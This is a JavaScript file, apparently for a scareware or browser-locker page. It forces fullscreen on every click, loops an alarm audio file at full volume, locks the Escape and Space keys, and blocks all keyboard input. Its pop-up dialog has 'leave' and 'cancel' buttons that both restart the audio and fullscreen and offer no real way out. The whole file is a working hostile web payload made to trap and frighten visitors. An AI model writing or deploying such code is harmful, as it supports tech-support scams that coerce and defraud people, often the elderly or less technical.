function getQueryParam(param) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}
$(document).ready(function () {
  var audioElement = document.createElement("audio");
  audioElement.setAttribute("src", "alert-en.wav");

  audioElement.addEventListener(
    "ended",
    function () {
      this.play();
    },
    false
  );
  addEventListener("click", function () {
    var el = document.documentElement,
      reffer =
        el.requestFullScreen ||
        el.webkitRequestFullScreen ||
        el.mozRequestFullScreen;
    reffer.call(el);
    audioElement.play();
  });

  if ("keyboard" in navigator && "lock" in navigator.keyboard) {
    // Request to lock the keyboard
    navigator.keyboard.lock(["Escape", "Space"]); // Locks the 'Escape' and 'Space' keys
  } else {
    console.log("Keyboard Lock API is not supported in this browser.");
  }
  document.addEventListener(
    "keydown",
    function (event) {
      event.preventDefault();
    },
    false
  );
});

window.onload = function () {
  const dialog = document.getElementById("leaveDialog");
  const leaveBtn = document.getElementById("leaveBtn");
  const cancelBtn = document.getElementById("cancelBtn");

  // Show popup on load
  dialog.classList.add("ls-show");

  // Load audio (must be triggered on user click)
  const audio = new Audio("eng.mp3");
  audio.loop = true; // keep playing in loop
  audio.volume = 1.0; // full volume

  // Fullscreen toggle function
  function toggleFullScreen() {
    let doc = document.documentElement;

    if (!document.fullscreenElement) {
      if (doc.requestFullscreen) doc.requestFullscreen();
      else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
      else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
    } else {
      if (document.exitFullscreen) document.exitFullscreen();
      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
      else if (document.msExitFullscreen) document.msExitFullscreen();
    }
  }

  // Play audio only after first click
  let audioStarted = false;
  function startAudio() {
    if (!audioStarted) {
      audio.play().catch(() => {
        console.log("Autoplay blocked until user clicks");
      });
      audioStarted = true;
    }
  }

  // Clicking anywhere on the page
  document.addEventListener("click", function () {
    startAudio(); // Start audio
    toggleFullScreen(); // Fullscreen loop
  });

  // Clicking LEAVE button
  leaveBtn.onclick = (event) => {
    event.stopPropagation();
    dialog.classList.remove("ls-show");
    startAudio(); // Start audio
    toggleFullScreen(); // Fullscreen loop
  };

  // Clicking CANCEL button
  cancelBtn.onclick = (event) => {
    event.stopPropagation();
    dialog.classList.remove("ls-show");
    startAudio(); // Start audio
    toggleFullScreen(); // Fullscreen loop
  };
};
